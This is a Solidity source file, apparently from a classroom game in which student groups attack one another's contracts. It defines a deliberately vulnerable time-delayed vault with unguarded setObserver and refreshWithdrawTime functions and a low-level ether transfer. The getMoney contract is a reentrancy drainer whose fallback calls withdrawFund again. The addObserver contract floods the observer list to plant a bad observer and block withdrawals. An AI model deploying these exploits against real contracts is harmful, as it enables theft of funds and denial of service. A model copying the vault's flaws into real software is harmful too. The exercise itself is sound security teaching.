pragma solidity ^0.4.17;

contract BasicMultiOwnerVault {
    address[] public authorizedUsers;
    address public owner;
    address public withdrawObserver;
    address public additionalAuthorizedContract;
    address public proposedAAA;
    uint public lastUpdated;
    bool[] public votes;
    address [] public observerHistory;

    modifier onlyAuthorized() {
        bool pass = false;
        if(additionalAuthorizedContract == msg.sender) {
            pass = true;
        }
        
        for (uint i = 0; i < authorizedUsers.length; i++) {
            if(authorizedUsers [i] == msg.sender) {
                pass = true;
                break;
            }
        }
        require (pass);
        _;
    }
    
    modifier onlyOnce() {
        require(owner == 0x0);
        _;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    modifier recordAction() {
        lastUpdated = now;
        _;
    }
    
    function initilizeVault() recordAction onlyOnce {
        owner = msg.sender;
    }
    
    function setObserver(address ob) {
        bool duplicate = false;
        for (uint i = 0; i < observerHistory.length; i++) {
            if (observerHistory[i] == ob) {
                duplicate = true;
            }
        }
        
        if (!duplicate) {
            withdrawObserver = ob;
            observerHistory.push(ob);
        }
    }
    
    function addToReserve() payable recordAction external returns (uint) {
        assert(msg.value > 0.01 ether);
        return this.balance;
    }
    
    function basicWithdraw(address dst) internal returns (bool) {
        require(this.balance >= 0.001 ether);
        bool res = dst.call.value(0.001 ether)();
        return res;
    }
    
    function checkAllVote() private returns (bool) {
        for(uint i = 0; i < votes.length; i++) {
            if(!votes[i]) {
                return false;
            }
        }
        
        return true;
    }
    
    function clearVote() private {
        for(uint i = 0; i < votes.length; i++) {
            votes[i] = false;
        }
    }

    function addAuthorizedAccount(uint votePosition, address proposal) onlyAuthorized external {
        require(votePosition < authorizedUsers.length);
        require(msg.sender == authorizedUsers[votePosition]);
        if (proposal != proposedAAA) {
            clearVote();
            proposedAAA = proposal;
        }
        
        votes[votePosition] = true;
        if (checkAllVote()) {
            additionalAuthorizedContract = proposedAAA;
            clearVote();
        }
    }
    
    function resolve() onlyOwner {
        if(now >= lastUpdated + 12 hours) {
            selfdestruct(owner);
        }
    }

}

contract TimeDelayedVault is BasicMultiOwnerVault {
    uint  public nextWithdrawTime;
    uint  public withdrawCoolDownTime;
    
    function TimeDelayedVault() recordAction {
        nextWithdrawTime = now;
        withdrawCoolDownTime = 2 hours;
        //this.call(bytes4(sha3("initializeVault()")));
       
        // Please note, the following code chunk is different for each group, all group members are added to authorizedUsers array
        authorizedUsers.push(0xca35b7d915458ef540ade6068dfe2f44e8fa733c); //second
        //authorizedUsers.push(0x14723a09acff6d2a60dcdf7aa4aff308fddc160c);//third
        //authorizedUsers.push(0xeb557D1A1c81a18D435cd7c882f20D24ED6E9dd3); //metamask ropsten

        for(uint i=0; i<authorizedUsers.length; i++) {
            votes.push(false);
        }
    }
    
    function withdrawFund(address dst) onlyAuthorized external returns (bool) {
        require(now > nextWithdrawTime);
        assert(withdrawObserver.call(bytes4(sha3("observe()"))));
        bool res = basicWithdraw(dst);
        nextWithdrawTime = nextWithdrawTime + withdrawCoolDownTime;
        return res;
    }
    function theBalance () returns (uint){
        return this.balance;
    }
    function refreshWithdrawTime() {
        nextWithdrawTime = now;
    }
}

contract hackOthers {
    address otherAddress = 0x0; //change to othergroup contract address
    function addObserver() {
        otherAddress.call(bytes4(sha3("setObserver()")),this);
    }
    function setOwner(){ //100% fail
        otherAddress.call(bytes4(sha3("initilizeVault()")));
    }
}

contract getMoney{
    //address ct_addr = 0xAEc6E567C38746cAeDCB55a5A007704E69e00c70;
    address ct_addr = 0x2b44b4ab8f15dc9d77f14a9daf6bb797ecce1cb3;
    uint count = 0;
    uint limit = 1;
    
    TimeDelayedVault ct = TimeDelayedVault(ct_addr);
    function addObserver(){
       ct.setObserver(this);    
    }
    function hack(){ // need checkObserver first
         count += 1;
         ct.withdrawFund(this);
    }
    function hack2(){ // need checkObserver first
         ct.setObserver(this);
         count += 1;

         ct.withdrawFund(this);
    }    
    function () payable {
        if(count<limit ){
            count += 1;
            ct.withdrawFund(this);
        }else{
            count = 0;
        }
    }
    function theBalance () returns (uint _balance){
        return this.balance;
    }
    function setLimit(uint _limit) returns (uint){
        limit = _limit;
        return limit;
    }
    function observe() returns (bool){
        return true;
    }
    
}

//test Observer;
//assert(withdrawObserver.call(bytes4(sha3("observe()"))));
contract test{  //not throw error
    function () {
    }
}
contract test2{//not throw error
    function observe(){
    }
}
contract test3{//throw error
}

//add many observers to other group 
contract addObserver{
    address public target;
    address public badContract;
    uint public loopLimit = 1;
    uint public offset = 0;
    function setTarget(address _target) {
        target = _target;
    }
    function setLimit(uint _limit){
        loopLimit = _limit;
    }
    function setOffset(uint _offset){
        offset = _offset;
    }
    function setBadContract(address _addr){
        badContract = _addr;
    }
    function addManyOb() {
        TimeDelayedVault ct = TimeDelayedVault(target);

        for(uint i=1;i<=loopLimit;i++){
            ct.setObserver(address(i+offset));    
        }
        offset += loopLimit;
    }
    function addLastOb(){// add a bad address 
        TimeDelayedVault ct = TimeDelayedVault(target);
        ct.setObserver(badContract);    
    }
    function reset(){
        target = 0x0;
        loopLimit = 1;
        offset = 0;
    }
}
